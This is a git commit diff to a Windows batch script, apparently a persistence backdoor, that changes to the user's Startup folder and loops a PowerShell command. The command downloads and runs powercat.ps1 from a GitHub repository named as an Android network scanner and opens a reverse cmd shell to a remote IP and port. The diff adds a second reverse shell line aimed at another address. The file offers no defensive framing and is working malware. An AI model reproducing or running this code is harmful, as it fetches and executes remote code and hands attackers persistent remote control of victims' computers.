54d274da601eddb7a44d7ee77af8f2427eae1c6b
wolfyy <60975463+wolfyy59@users.noreply.github.com>
2021-03-19 00:28:02 -1200

    Update netcat.bat

--- netcat.bat
+++ netcat.bat
@@ -5,4 +5,5 @@ cd  %userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup 
 timeout 40
 :start
 powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/wolfyy59/network_scan_android/main/powercat.ps1');powercat -c 193.161.193.99 -p 63699 -e cmd"
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/wolfyy59/network_scan_android/main/powercat.ps1');powercat -c 192.168.0.189 -p 4444 -e cmd"
 goto start
